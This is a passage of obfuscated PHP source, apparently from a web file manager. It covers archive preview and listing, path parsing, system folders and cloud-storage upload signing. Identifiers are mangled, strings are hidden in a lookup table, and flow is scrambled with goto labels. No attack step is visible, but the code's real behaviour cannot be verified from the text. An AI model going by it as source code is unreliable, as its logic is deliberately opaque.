array($C¶†ßƒš¢…[85] => $C¹¬Ã¯‰Ê³); } } $C¹¬Ã¯‰Ê³ = $e‡¦”÷ùì[$C¶†ßƒš¢…[85]]; goto dª‚ÖÉÅ§¶; F¿‡Ç¾‹Ãš: if (!@file_exists(self::iconvSystem($aŒÛ Ê•¿))) { $b¿‘˜¢­ã = self::localFilePath($cÀ©„ªèÃ, $f›ö÷ù‘); $aŒÛ Ê•¿ = $b¿‘˜¢­ã ? $b¿‘˜¢­ã : parent::download($cÀ©„ªèÃ, $aŒÛ Ê•¿); } $aŒÛ Ê•¿ = self::iconvSystem($aŒÛ Ê•¿); $C÷½ ¼•ˆ” = isset($eŠŞ¦Ù›ó[$C¶†ßƒš¢…[1052]]) ? $eŠŞ¦Ù›ó[$C¶†ßƒš¢…[1052]] : $C¶†ßƒš¢…[1053]; goto D’ø£Ñ‡óñ; F¬î‘íÙÀˆ: } public static function unzipList($f¸ˆ…¤òà) { goto Dù­’…ùåÂ; B‚ßóØ÷·£: if (!is_dir($Bî Ù´Ó)) { mk_dir($Bî Ù´Ó); } $fáÈäˆíš = $Bî Ù´Ó . $b²ÒÙò±‰·[8] . $fğ†Áàõ¥; if (!@file_exists(self::iconvSystem($fáÈäˆíš))) { if (isset($c‡Š”’ëßº)) { url_request($FÆØÈòˆƒ, $b²ÒÙò±‰·[1061], $fáÈäˆíš); } else { $E—í™ñ£äÇ = self::localFilePath($FÆØÈòˆƒ, $a»×ª¨Éˆ); $fáÈäˆíš = $E—í™ñ£äÇ ? $E—í™ñ£äÇ : self::download($FÆØÈòˆƒ, $fáÈäˆíš); } } goto c›¡ğ¿Ë­‰; Bøæ¥×ò: $b‰¨ÉÌš = self::info($e‚›É©òŞã); $a»×ª¨Éˆ = self::fileExt($b‰¨ÉÌš); $fİ”Â½Ğ’ = self::tmpFileName($b‰¨ÉÌš); goto aãŠº­Ò²ø; EèÈÈ˜–¸¡: self::archiveExt(); del_dir($Bî Ù´Ó); if (!$EÒòãƒêÚè[$b²ÒÙò±‰·[1054]]) { show_json($EÒòãƒêÚè[$b²ÒÙò±‰·[1056]], !1); } goto b‘Ê§î…Ä¿; aãŠº­Ò²ø: if (isset($c‡Š”’ëßº)) { $d®òÚ¦¨£İ = array($c‡Š”’ëßº[$b²ÒÙò±‰·[85]], $c‡Š”’ëßº[$b²ÒÙò±‰·[1058]], $c‡Š”’ëßº[$b²ÒÙò±‰·[38]]); $fğ†Áàõ¥ = md5(implode($b²ÒÙò±‰·[80], $d®òÚ¦¨£İ)) . $b²ÒÙò±‰·[101] . get_path_ext($c‡Š”’ëßº[$b²ÒÙò±‰·[38]]); } else { $d®òÚ¦¨£İ = array($b‰¨ÉÌš[$b²ÒÙò±‰·[38]], $b‰¨ÉÌš[$b²ÒÙò±‰·[85]], $b‰¨ÉÌš[$b²ÒÙò±‰·[87]]); $fğ†Áàõ¥ = md5(implode($b²ÒÙò±‰·[80], $d®òÚ¦¨£İ)) . $b²ÒÙò±‰·[101] . $a»×ª¨Éˆ; } if ($c„‚á¿ºµˆ == -1) { $bĞ›ˆ¯Œ = IO_PATH_SYSTEM_TEMP . "\x7a\x69\x70\126\x69\145\167\57{$fİ”Â½Ğ’}\x2f{$fğ†Áàõ¥}\56\x6c\157\x67"; $C‰‹çñõä‰ = self::infoFull($bĞ›ˆ¯Œ); if ($C‰‹çñõä‰) { $bĞ›ˆ¯Œ = $C‰‹çñõä‰[$b²ÒÙò±‰·[85]]; $Aç¸ñ‘Ë§· = self::getContent($bĞ›ˆ¯Œ); if ($Aç¸ñ‘Ë§·) { $cØ°á¬ä·‡ = json_decode($Aç¸ñ‘Ë§·, !0); if (count($cØ°á¬ä·‡) >= $Dœ¾ª†ˆ¢Ì) { show_json(sprintf(LNG($b²ÒÙò±‰·[1060]), count($cØ°á¬ä·‡)), !1); } return $cØ°á¬ä·‡; } } else { $bĞ›ˆ¯Œ = self::mkfile($bĞ›ˆ¯Œ); } } $Bî Ù´Ó = TEMP_FILES . $fİ”Â½Ğ’; goto B‚ßóØ÷·£; Dù­’…ùåÂ: $b²ÒÙò±‰· =& $_SERVER[±á õÁ]; $FÆØÈòˆƒ = $f¸ˆ…¤òà[$b²ÒÙò±‰·[85]]; $c„‚á¿ºµˆ = isset($f¸ˆ…¤òà[$b²ÒÙò±‰·[1058]]) ? $f¸ˆ…¤òà[$b²ÒÙò±‰·[1058]] : -1; goto eäÈ­˜Å­; b‘Ê§î…Ä¿: $cØ°á¬ä·‡ = json_encode($EÒòãƒêÚè[$b²ÒÙò±‰·[1056]]); self::setContent($bĞ›ˆ¯Œ, $cØ°á¬ä·‡); if (count($EÒòãƒêÚè[$b²ÒÙò±‰·[1056]]) >= $Dœ¾ª†ˆ¢Ì) { show_json(sprintf(LNG($b²ÒÙò±‰·[1060]), count($EÒòãƒêÚè[$b²ÒÙò±‰·[1056]])), !1); } goto cï†‰îó„©; eäÈ­˜Å­: $Dœ¾ª†ˆ¢Ì = 50000; if (request_url_safe($FÆØÈòˆƒ)) { $c‡Š”’ëßº = parse_url_query($FÆØÈòˆƒ); if (!isset($c‡Š”’ëßº[$b²ÒÙò±‰·[85]])) { show_json($b²ÒÙò±‰·[1059], !1); } } $e‚›É©òŞã = isset($c‡Š”’ëßº) ? $c‡Š”’ëßº[$b²ÒÙò±‰·[85]] : $FÆØÈòˆƒ; goto Bøæ¥×ò; cï†‰îó„©: return $EÒòãƒêÚè[$b²ÒÙò±‰·[1056]]; goto C±ÏŒ¯ë´³; c›¡ğ¿Ë­‰: $fáÈäˆíš = self::iconvSystem($fáÈäˆíš); if ($c„‚á¿ºµˆ >= 0) { $eÌÇ×äÜø÷ = isset($f¸ˆ…¤òà[$b²ÒÙò±‰·[1062]]) ? $f¸ˆ…¤òà[$b²ÒÙò±‰·[1062]] : !1; $a¦ø…‚ÑË = isset($f¸ˆ…¤òà[$b²ÒÙò±‰·[38]]) ? $f¸ˆ…¤òà[$b²ÒÙò±‰·[38]] : $b²ÒÙò±‰·[43]; KodArchive::filePreview($fáÈäˆíš, $c„‚á¿ºµˆ, $eÌÇ×äÜø÷, $a¦ø…‚ÑË); self::archiveExt(); die; } $EÒòãƒêÚè = KodArchive::listContent($fáÈäˆíš); goto EèÈÈ˜–¸¡; C±ÏŒ¯ë´³: } private static function fileExt($d¡¬ÀØñ‰Ø) { $DÛ‚…´˜Î =& $_SERVER[±á õÁ]; $F¨âá°òÈÄ = $d¡¬ÀØñ‰Ø[$DÛ‚…´˜Î[175]]; if ($F¨âá°òÈÄ == $DÛ‚…´˜Î[1063]) { $CŸÙšò‘‚ª = $DÛ‚…´˜Î[1064]; if (substr($d¡¬ÀØñ‰Ø[$DÛ‚…´˜Î[38]], -strlen($CŸÙšò‘‚ª)) == $CŸÙšò‘‚ª) { $F¨âá°òÈÄ = $DÛ‚…´˜Î[1065]; } } self::archiveExt($F¨âá°òÈÄ); return $F¨âá°òÈÄ; } private static function zipFileList($e‰¬Ä•¤¨á, $E¢¡Å–‡Ê² = false) { $Aã¹ä¢½ =& $_SERVER[±á õÁ]; $dÕƒÛŸ…¸ë = array(); foreach ($e‰¬Ä•¤¨á as $e‰ÄŞÕö) { $c¤¾ÑÎ§Ûä = $e‰ÄŞÕö[$Aã¹ä¢½[85]]; if ($E¢¡Å–‡Ê²) { $c¤¾ÑÎ§Ûä = self::copy($e‰ÄŞÕö[$Aã¹ä¢½[85]], $E¢¡Å–‡Ê², $Aã¹ä¢½[769]); } else { $cÛ§íÒ»Ê® = self::init($e‰ÄŞÕö[$Aã¹ä¢½[85]]); if ($cÛ§íÒ»Ê®->getType() == $Aã¹ä¢½[112]) { $c¤¾ÑÎ§Ûä = $cÛ§íÒ»Ê®->path; } } if ($c¤¾ÑÎ§Ûä && self::local()->exist($c¤¾ÑÎ§Ûä)) { $dÕƒÛŸ…¸ë[$e‰ÄŞÕö[$Aã¹ä¢½[85]]] = $c¤¾ÑÎ§Ûä; } } if (!empty($dÕƒÛŸ…¸ë)) { return array_values($dÕƒÛŸ…¸ë); } show_json(LNG($Aã¹ä¢½[1031]), !1); } public static function tmpFileName($e¨äµ¢ ±¹) { $FèÔô¿ìà =& $_SERVER[±á õÁ]; $DùŞİ°Ë“ƒ = array($e¨äµ¢ ±¹[$FèÔô¿ìà[38]], $e¨äµ¢ ±¹[$FèÔô¿ìà[85]], $e¨äµ¢ ±¹[$FèÔô¿ìà[87]], $e¨äµ¢ ±¹[$FèÔô¿ìà[484]]); return md5(implode($FèÔô¿ìà[80], $DùŞİ°Ë“ƒ)); } private static function localFilePath($D»¶™†¬Ëò, $EõâŒ™¦öŸ) { goto BÒÒøÛ§¢; f„ÀÃÄï¢Ä: if ($b”¬øŒŠ‹ == $eë…Ãí˜®Õ[112] || $b”¬øŒŠ‹ == $eë…Ãí˜®Õ[1069]) { if (!$bôÁŞ‘Ø¸->exist($bôÁŞ‘Ø¸->path)) { show_json(LNG($eë…Ãí˜®Õ[111]), !1); } return $bôÁŞ‘Ø¸->path; } return !1; goto f‰çä²…ï; AÍ¨š„ê‰: if ($b»…ÑÆ¨Ã[$eë…Ãí˜®Õ[39]] == KodIO::KOD_SOURCE) { $fˆÓÏêœ· = Model($eë…Ãí˜®Õ[776])->fileInfoGet(KodIO::sourceID($D»¶™†¬Ëò)); if (!$fˆÓÏêœ·[$eë…Ãí˜®Õ[85]]) { show_json($eë…Ãí˜®Õ[1068], !1); } $D»¶™†¬Ëò = $fˆÓÏêœ·[$eë…Ãí˜®Õ[85]]; } $bôÁŞ‘Ø¸ = self::init($D»¶™†¬Ëò); $b”¬øŒŠ‹ = $bôÁŞ‘Ø¸->getType(); goto f„ÀÃÄï¢Ä; BÒÒøÛ§¢: $eë…Ãí˜®Õ =& $_SERVER[±á õÁ]; if ($EõâŒ™¦öŸ == $eë…Ãí˜®Õ[1066] && strtoupper(substr(PHP_OS, 0, 3)) == $eë…Ãí˜®Õ[1067]) { return !1; } $b»…ÑÆ¨Ã = KodIO::parse($D»¶™†¬Ëò); goto AÍ¨š„ê‰; f‰çä²…ï: } private static function archiveExt($AÛŒÛ©”‡ = '') { $GLOBALS[$_SERVER[±á õÁ][1070]] = $AÛŒÛ©”‡; } } class KodIO { const KOD_SOURCE = "\x7b\163\x6f\165\x72\x63\145\175"; const KOD_USER_RECYCLE = "\x7b\x75\163\x65\x72\122\x65\x63\171\x63\x6c\145\x7d"; const KOD_USER_FAV = "\x7b\x75\x73\145\162\106\x61\166\x7d"; const KOD_USER_FILE_TAG = "\173\x75\x73\145\x72\x46\x69\x6c\x65\124\141\x67\175"; const KOD_USER_FILE_TYPE = "\x7b\x75\x73\x65\x72\106\x69\x6c\145\x54\x79\160\145\175"; const KOD_GROUP_ROOT_SELF = "\x7b\147\x72\x6f\x75\160\122\x6f\157\x74\x53\x65\154\x66\x7d"; const KOD_USER_SHARE = "\x7b\165\x73\x65\x72\123\150\x61\162\x65\x7d"; const KOD_USER_SHARE_LINK = "\173\165\163\x65\x72\123\x68\x61\162\145\x4c\151\x6e\x6b\175"; const KOD_USER_SHARE_TO_ME = "\x7b\163\x68\x61\162\145\x54\x6f\115\x65\x7d"; const KOD_SHARE_ITEM = "\x7b\x73\150\141\162\x65\x49\x74\145\155\175"; const KOD_SHARE_LINK = "\173\x73\150\x61\x72\x65\111\x74\145\155\114\151\x6e\153\175"; const KOD_SEARCH = "\173\x73\145\x61\162\x63\150\x7d"; const KOD_BLOCK = "\173\142\x6c\x6f\x63\153\175"; const KOD_IO = "\x7b\151\x6f\175"; const KOD_USER_RECENT = "\x7b\x75\x73\x65\162\122\x65\x6e\x63\145\x6e\164\x7d"; const KOD_USER_DRIVER = "\173\x64\x72\151\166\145\162\x7d"; public static function typeList() { $f…âßà‚òô =& $_SERVER[±á õÁ]; return array($f…âßà‚òô[1071] => self::KOD_SOURCE, $f…âßà‚òô[1072] => self::KOD_USER_RECYCLE, $f…âßà‚òô[1073] => self::KOD_USER_FAV, $f…âßà‚òô[1074] => self::KOD_USER_FILE_TAG, $f…âßà‚òô[1075] => self::KOD_USER_FILE_TYPE, $f…âßà‚òô[1076] => self::KOD_GROUP_ROOT_SELF, $f…âßà‚òô[1077] => self::KOD_USER_SHARE, $f…âßà‚òô[1078] => self::KOD_USER_SHARE_LINK, $f…âßà‚òô[1079] => self::KOD_USER_SHARE_TO_ME, $f…âßà‚òô[1080] => self::KOD_SHARE_ITEM, $f…âßà‚òô[1081] => self::KOD_SHARE_LINK, $f…âßà‚òô[1082] => self::KOD_SEARCH, $f…âßà‚òô[1083] => self::KOD_BLOCK, $f…âßà‚òô[1084] => self::KOD_IO, $f…âßà‚òô[1085] => self::KOD_USER_RECENT, $f…âßà‚òô[1086] => self::KOD_USER_DRIVER); } public static function parse($D‹¿‡Ú‚áé) { goto c‘¾´…·„¤; c‘¾´…·„¤: $B ĞÛÍÀ¡ =& $_SERVER[±á õÁ]; $D‹¿‡Ú‚áé = self::clear($D‹¿‡Ú‚áé); $dš¢ˆçáª = array_values(self::typeList()); goto e¦¡ª»Ğ°ñ; C‡³ÂÈôÒ…: $CˆÖôÊÍŸ› = array($B ĞÛÍÀ¡[43], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $FóÁŠ†¼ÜŞ[$B ĞÛÍÀ¡[1091]] = in_array($FóÁŠ†¼ÜŞ[$B ĞÛÍÀ¡[39]], $CˆÖôÊÍŸ›); return $FóÁŠ†¼ÜŞ; goto fö³÷œĞ²î; e¦¡ª»Ğ°ñ: preg_match($B ĞÛÍÀ¡[1087], $D‹¿‡Ú‚áé, $aíÛñº¿ÆÔ); $FóÁŠ†¼ÜŞ = array($B ĞÛÍÀ¡[412] => !1, $B ĞÛÍÀ¡[1088] => !1, $B ĞÛÍÀ¡[409] => !1, $B ĞÛÍÀ¡[85] => $D‹¿‡Ú‚áé, $B ĞÛÍÀ¡[1035] => !1, $B ĞÛÍÀ¡[1034] => $B ĞÛÍÀ¡[43]); if (is_array($aíÛñº¿ÆÔ) && count($aíÛñº¿ÆÔ) == 5) { $aÄñØ™Ì× = $B ĞÛÍÀ¡[1089] . $aíÛñº¿ÆÔ[2] . $B ĞÛÍÀ¡[330]; if (in_array($aÄñØ™Ì×, $dš¢ˆçáª)) { $FóÁŠ†¼ÜŞ[$B ĞÛÍÀ¡[1035]] = $aíÛñº¿ÆÔ[1]; $FóÁŠ†¼ÜŞ[$B ĞÛÍÀ¡[39]] = $aÄñØ™Ì×; $FóÁŠ†¼ÜŞ[$B ĞÛÍÀ¡[1090]] = substr($aÄñØ™Ì×, 1, -1); $FóÁŠ†¼ÜŞ[$B ĞÛÍÀ¡[391]] = $aíÛñº¿ÆÔ[3]; } $FóÁŠ†¼ÜŞ[$B ĞÛÍÀ¡[1034]] = $aíÛñº¿ÆÔ[4]; } goto C‡³ÂÈôÒ…; fö³÷œĞ²î: } public static function clear($aè¡ÖªŸõÍ) { goto fÌ¦Æ™Ñ×Ë; Aõ­İø‡¤È: $aè¡ÖªŸõÍ = preg_replace($A¯Âƒ¦³£[1094], $A¯Âƒ¦³£[8], $aè¡ÖªŸõÍ); if ($aè¡ÖªŸõÍ == $A¯Âƒ¦³£[8]) { return $A¯Âƒ¦³£[8]; } $aè¡ÖªŸõÍ = rtrim($aè¡ÖªŸõÍ, $A¯Âƒ¦³£[8]); goto F¸ó¸ï¶²¸; báÙºËÓÁÚ: $d¶¹™’°Ğ† = $A¯Âƒ¦³£[1092]; if (substr($aè¡ÖªŸõÍ, 0, 3) == $A¯Âƒ¦³£[1093]) { $aè¡ÖªŸõÍ = substr($aè¡ÖªŸõÍ, 3); } while (strstr($aè¡ÖªŸõÍ, $d¶¹™’°Ğ†)) { $aè¡ÖªŸõÍ = str_replace($d¶¹™’°Ğ†, $A¯Âƒ¦³£[8], $aè¡ÖªŸõÍ); } goto Aõ­İø‡¤È; fÌ¦Æ™Ñ×Ë: $A¯Âƒ¦³£ =& $_SERVER[±á õÁ]; $aè¡ÖªŸõÍ = str_replace(array($A¯Âƒ¦³£[1010], $A¯Âƒ¦³£[14]), $A¯Âƒ¦³£[60], $aè¡ÖªŸõÍ); $aè¡ÖªŸõÍ = str_replace($A¯Âƒ¦³£[103], $A¯Âƒ¦³£[8], $aè¡ÖªŸõÍ); goto báÙºËÓÁÚ; F¸ó¸ï¶²¸: return $aè¡ÖªŸõÍ; goto fè‰ÅØ‹; fè‰ÅØ‹: } public static function sourceID($dçÒŞÇ¯ŠŠ) { $dµ¨‚ëùäÜ =& $_SERVER[±á õÁ]; $A“³óƒ§§÷ = self::parse($dçÒŞÇ¯ŠŠ); if ($A“³óƒ§§÷[$dµ¨‚ëùäÜ[39]] !== self::KOD_SOURCE) { show_json(LNG($dµ¨‚ëùäÜ[1095]), !1); } return $A“³óƒ§§÷[$dµ¨‚ëùäÜ[391]]; } public static function make($A·Á©Œ›¢) { if (!$A·Á©Œ›¢) { return !1; } return self::makePath(self::KOD_SOURCE, intval($A·Á©Œ›¢)); } public static function makeShare($Bƒ®‘©ø‚¤, $eÀ‡Ù‰Ÿ) { return self::makePath(self::KOD_SHARE_ITEM, $Bƒ®‘©ø‚¤, $eÀ‡Ù‰Ÿ); } public static function makeFileTypePath($B•ÊÒÈö÷¢) { return self::makePath(self::KOD_USER_FILE_TYPE, $B•ÊÒÈö÷¢); } public static function makeFileTagPath($aæÕ¡Ã”ï) { return self::makePath(self::KOD_USER_FILE_TAG, $aæÕ¡Ã”ï); } public static function makePath($f–æìËĞ‚…, $dƒïÇçÂïÙ = '', $AÈäâîÂ— = '') { $FÌŒš×õ– =& $_SERVER[±á õÁ]; $FŠ«äƒëƒ = substr($f–æìËĞ‚…, 1, -1); $DõŞÛÂë® = $FÌŒš×õ–[1096] . $FŠ«äƒëƒ . $FÌŒš×õ–[1097] . $dƒïÇçÂïÙ . $FÌŒš×õ–[1098]; $DõŞÛÂë® = $AÈäâîÂ— ? $DõŞÛÂë® . $AÈäâîÂ— . $FÌŒš×õ–[8] : $DõŞÛÂë®; return $DõŞÛÂë®; } public static function hashPath($e¨“¸‚‘”) { $E“õòÌ¡‡ö =& $_SERVER[±á õÁ]; $bÌ±¬»èÃ = is_array($e¨“¸‚‘”) ? $e¨“¸‚‘” : IO::info($e¨“¸‚‘”); $Bâ´¦ôŠ = _get($bÌ±¬»èÃ, $E“õòÌ¡‡ö[1099], $E“õòÌ¡‡ö[43]); if (!$Bâ´¦ôŠ) { $C¯‹ãƒÖÖ = KodIO::parse($bÌ±¬»èÃ[$E“õòÌ¡‡ö[85]]); if (!$C¯‹ãƒÖÖ[$E“õòÌ¡‡ö[39]]) { $Bâ´¦ôŠ = IO::hashSimple($bÌ±¬»èÃ[$E“õòÌ¡‡ö[85]]); } } if (!$Bâ´¦ôŠ) { $Bâ´¦ôŠ = md5($bÌ±¬»èÃ[$E“õòÌ¡‡ö[85]] . $bÌ±¬»èÃ[$E“õòÌ¡‡ö[87]] . $bÌ±¬»èÃ[$E“õòÌ¡‡ö[117]]); } return $Bâ´¦ôŠ; } public static function initSystemPath() { $fÃÃ”³ĞÚ =& $_SERVER[±á õÁ]; if (defined($fÃÃ”³ĞÚ[1100])) { return; } define($fÃÃ”³ĞÚ[1100], self::systemPath($fÃÃ”³ĞÚ[1101])); define($fÃÃ”³ĞÚ[1102], self::systemPath($fÃÃ”³ĞÚ[1103])); define($fÃÃ”³ĞÚ[1104], self::systemPath($fÃÃ”³ĞÚ[1105])); define($fÃÃ”³ĞÚ[1106], self::systemPath($fÃÃ”³ĞÚ[1107])); } public static function systemPath($a‰š÷¦í˜) { goto cøÖÅ¨µÙ; aò¨Ôº‰äñ: return $aÕõê½ŠóÈ; goto DÅ³æ•éå; Fï—Œê: if ($aÕõê½ŠóÈ) { return $aÕõê½ŠóÈ; } if ($a‰š÷¦í˜ == $AÚ‹„õ‘›Ø[1101]) { $aÕõê½ŠóÈ = self::make(Model($AÚ‹„õ‘›Ø[776])->systemRootPathAdd($AÚ‹„õ‘›Ø[1110])); } else { $aÕõê½ŠóÈ = self::systemPath($AÚ‹„õ‘›Ø[1101]); $c–È††¡½ª = self::sourceID($aÕõê½ŠóÈ); $aÕõê½ŠóÈ = self::make(Model($AÚ‹„õ‘›Ø[776])->mkdir($c–È††¡½ª, $a‰š÷¦í˜)); } Model($AÚ‹„õ‘›Ø[1109])->set($b‡‹£ö®µÊ, $aÕõê½ŠóÈ); goto aò¨Ôº‰äñ; cøÖÅ¨µÙ: $AÚ‹„õ‘›Ø =& $_SERVER[±á õÁ]; $b‡‹£ö®µÊ = $AÚ‹„õ‘›Ø[1108] . ucfirst($a‰š÷¦í˜); $aÕõê½ŠóÈ = Model($AÚ‹„õ‘›Ø[1109])->get($b‡‹£ö®µÊ); goto Fï—Œê; DÅ³æ•éå: } public static function systemFolder($bìÍÚÅí) { $Dóà¶Š’ß = IO_PATH_SYSTEM_SOURCE . $bìÍÚÅí; $F±ŸÍÛæ¹‰ = Cache::get($Dóà¶Š’ß); if (!$F±ŸÍÛæ¹‰) { $déãÄÂ¾î” = IO::infoFull($Dóà¶Š’ß); if (!$déãÄÂ¾î”) { $F±ŸÍÛæ¹‰ = IO::mkdir($Dóà¶Š’ß, REPEAT_SKIP); } else { $F±ŸÍÛæ¹‰ = $déãÄÂ¾î”[$_SERVER[±á õÁ][85]]; } Cache::set($Dóà¶Š’ß, $F±ŸÍÛæ¹‰, 3600 * 10); } return $F±ŸÍÛæ¹‰; } public static function defaultDriver() { return Model($_SERVER[±á õÁ][728])->defaultDriver(); } public static function defaultIO() { $aö¢èìÇÆ =& $_SERVER[±á õÁ]; $F¯Œ­ÆÛ¶ = self::defaultDriver(); return $aö¢èìÇÆ[1111] . $F¯Œ­ÆÛ¶[$aö¢èìÇÆ[391]] . $aö¢èìÇÆ[1098]; } public static function defaultDriverInit() { static $B¦œ¦œ“Úâ = false; if ($B¦œ¦œ“Úâ) { return $B¦œ¦œ“Úâ; } $B¦œ¦œ“Úâ = IO::init(self::defaultIO()); return $B¦œ¦œ“Úâ; } public static function fileTypeList() { $cøˆø’‹Ù =& $_SERVER[±á õÁ]; $e‡ñÆŠÃíà = $GLOBALS[$cøˆø’‹Ù[6]][$cøˆø’‹Ù[1112]]; foreach ($e‡ñÆŠÃíà as $f’¸£êù›Õ => $f¢†ŞŠïÜÙ) { $fğÚ‡àÇÇø = $cøˆø’‹Ù[1113] . $f’¸£êù›Õ; $Bñ†º  = LNG($fğÚ‡àÇÇø); if ($fğÚ‡àÇÇø != $Bñ†º ) { $e‡ñÆŠÃíà[$f’¸£êù›Õ][$cøˆø’‹Ù[38]] = $Bñ†º ; } } return $e‡ñÆŠÃíà; } public static function transferType($c÷Ÿ×Á˜‚, $f‹Ï˜º‹æ) { goto Dï²§šÍÃÙ; C¡­Æİ—˜À: return $cÆÂ°‹òÖ™[1116]; goto a´Š±¤ä„; AÃÚ£¥‹´Å: if ($d§ÅĞËğáó[$cÆÂ°‹òÖ™[39]] == $Bœ†µ¢¢ó[$cÆÂ°‹òÖ™[39]] && $d§ÅĞËğáó[$cÆÂ°‹òÖ™[1114]] == $Bœ†µ¢¢ó[$cÆÂ°‹òÖ™[1114]]) { return $cÆÂ°‹òÖ™[1115]; } if ($d§ÅĞËğáó[$cÆÂ°‹òÖ™[39]] == $cÆÂ°‹òÖ™[806] && $Bœ†µ¢¢ó[$cÆÂ°‹òÖ™[39]] == $cÆÂ°‹òÖ™[112]) { return $cÆÂ°‹òÖ™[1062]; } if ($d§ÅĞËğáó[$cÆÂ°‹òÖ™[39]] == $cÆÂ°‹òÖ™[112] && $Bœ†µ¢¢ó[$cÆÂ°‹òÖ™[39]] == $cÆÂ°‹òÖ™[806]) { return $cÆÂ°‹òÖ™[113]; } goto C¡­Æİ—˜À; Dï²§šÍÃÙ: $cÆÂ°‹òÖ™ =& $_SERVER[±á õÁ]; $d§ÅĞËğáó = self::driverType($c÷Ÿ×Á˜‚); $Bœ†µ¢¢ó = self::driverType($f‹Ï˜º‹æ); goto AÃÚ£¥‹´Å; a´Š±¤ä„: } public static function driverType($A¾¶ŠÙã£ò) { goto fà˜„ËÇò…; fà˜„ËÇò…: $AÎàÕ•Ò­ =& $_SERVER[±á õÁ]; $D…°ÕïÊÚ‘ = $A¾¶ŠÙã£ò->path; $dÒæà‡¢—ß = str_replace($AÎàÕ•Ò­[1117], $AÎàÕ•Ò­[43], strtolower($A¾¶ŠÙã£ò->getType())); goto Bë­†ˆŠ§Ï; Bë­†ˆŠ§Ï: if ($dÒæà‡¢—ß == $AÎàÕ•Ò­[719] || $dÒæà‡¢—ß == $AÎàÕ•Ò­[1118] || $dÒæà‡¢—ß == $AÎàÕ•Ò­[1119]) { $A¾¶ŠÙã£ò = self::defaultDriverInit(); } else { if ($dÒæà‡¢—ß == $AÎàÕ•Ò­[1069] || $dÒæà‡¢—ß == $AÎàÕ•Ò­[1120]) { $A¾¶ŠÙã£ò = IO::init($A¾¶ŠÙã£ò->pathParse[$AÎàÕ•Ò­[1016]]); } } $dÒæà‡¢—ß = str_replace($AÎàÕ•Ò­[1117], $AÎàÕ•Ò­[43], strtolower($A¾¶ŠÙã£ò->getType())); if ($dÒæà‡¢—ß == $AÎàÕ•Ò­[112]) { return array($AÎàÕ•Ò­[39] => $AÎàÕ•Ò­[112], $AÎàÕ•Ò­[1114] => $AÎàÕ•Ò­[43], $AÎàÕ•Ò­[85] => $D…°ÕïÊÚ‘); } goto bˆ†œŠŠ¢ô; bˆ†œŠŠ¢ô: return array($AÎàÕ•Ò­[39] => $AÎàÕ•Ò­[806], $AÎàÕ•Ò­[1114] => $A¾¶ŠÙã£ò->pathDriver, $AÎàÕ•Ò­[85] => $D…°ÕïÊÚ‘); goto F·¡ê«ÅÕ«; F·¡ê«ÅÕ«: } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($E‰äùÏĞ©) { parent::__construct($E‰äùÏĞ©); $this->signatureVersion($_SERVER[±á õÁ][218]); } public function uploadFormData($FÏ«î°Ù÷, $e …šó¥½Ş = 3600) { goto FèòõŠ¯ªä; B± š©È–: $bèõäïğøŠ = array($EÔ¹Ÿ’©‹[1123] => $D¸¥ÂÓåÂ, $EÔ¹Ÿ’©‹[1124] => array(array($EÔ¹Ÿ’©‹[1125] => $d­§ˆ‹ĞÇæ), array($EÔ¹Ÿ’©‹[1126] => $this->bucket), array($EÔ¹Ÿ’©‹[1127], $EÔ¹Ÿ’©‹[1128], $EÔ¹Ÿ’©‹[43]), array($EÔ¹Ÿ’©‹[1129] => $Cë›ø˜‹­ö), array($EÔ¹Ÿ’©‹[1130] => $bË¯¥ĞÈ), array($EÔ¹Ÿ’©‹[1131] => $this->accessKey), array($EÔ¹Ÿ’©‹[1132] => $Bºâãİƒå°))); $bèõäïğøŠ = json_encode($bèõäïğøŠ); $A˜Å³ªä‡  = hash_hmac($EÔ¹Ÿ’©‹[235], $Bºâãİƒå°, $this->secret); goto BÆˆâëğã; BÆˆâëğã: $Ešğ¢ğƒ° = sha1($bèõäïğøŠ); $Có˜¼²‚¿‰ = hash_hmac($EÔ¹Ÿ’©‹[235], $Ešğ¢ğƒ°, $A˜Å³ªä‡ ); $Cã†°ñÎå– = array($EÔ¹Ÿ’©‹[1125] => $d­§ˆ‹ĞÇæ, $EÔ¹Ÿ’©‹[1129] => $Cë›ø˜‹­ö, $EÔ¹Ÿ’©‹[1133] => base64_encode($bèõäïğøŠ), $EÔ¹Ÿ’©‹[1130] => $bË¯¥ĞÈ, $EÔ¹Ÿ’©‹[1131] => $this->accessKey, $EÔ¹Ÿ’©‹[1134] => $Bºâãİƒå°, $EÔ¹Ÿ’©‹[1135] => $Có˜¼²‚¿‰, $EÔ¹Ÿ’©‹[183] => $this->getHost()); goto A—õ‰ªƒ¤¼; A—õ‰ªƒ¤¼: return $Cã†°ñÎå–; goto b‹‹„ß‡¤¢; Eí›’ø¯¸Ó: $Cë›ø˜‹­ö = $EÔ¹Ÿ’©‹[1121]; $D¸¥ÂÓåÂ = gmdate($EÔ¹Ÿ’©‹[1122], time() + $e …šó¥½Ş); $Bºâãİƒå° = (string) time() . $EÔ¹Ÿ’©‹[77] . (string) (time() + $e …šó¥½Ş); goto B± š©È–; FèòõŠ¯ªä: $EÔ¹Ÿ’©‹ =& $_SERVER[±á õÁ]; $d­§ˆ‹ĞÇæ = $EÔ¹Ÿ’©‹[199]; $bË¯¥ĞÈ = $EÔ¹Ÿ’©‹[235]; goto Eí›’ø¯¸Ó; b‹‹„ß‡¤¢: } public function fileOutLink($A°êµŞÂß–) { $Dø‰Š˜†Ñ =& $_SERVER[±á õÁ]; if (substr($A°êµŞÂß–, 0, 7) == $Dø‰Š˜†Ñ[1136]) { $A°êµŞÂß– = $Dø‰Š˜†Ñ[1137] . substr($A°êµŞÂß–, 7); } header($Dø‰Š˜†Ñ[166] . $A°êµŞÂß–); die; } } goto E»ª‰‘—‡; Cò‹ÍŒÈÜ: class PathDriverDriverShareItem { public function __construct($BÍ½éšÜ) { $this->pathParse = $BÍ½éšÜ; } public function __call($Bµ„ã‰á¡, $Båƒæõ–§Û) { $c™Ê”ô¹ÌŸ =& $_SERVER[±á õÁ]; if (method_exists($this, $Bµ„ã‰á¡)) { return; } $eùùÆ¦ğ§ä = call_user_func_array(array($c™Ê”ô¹ÌŸ[1146], $Bµ„ã‰á¡), $Båƒæõ–§Û); $dôí•æ¹Õè = array($c™Ê”ô¹ÌŸ[1147], $c™Ê”ô¹ÌŸ[1148], $c™Ê”ô¹ÌŸ[1149], $c™Ê”ô¹ÌŸ[1150], $c™Ê”ô¹ÌŸ[515], $c™Ê”ô¹ÌŸ[517], 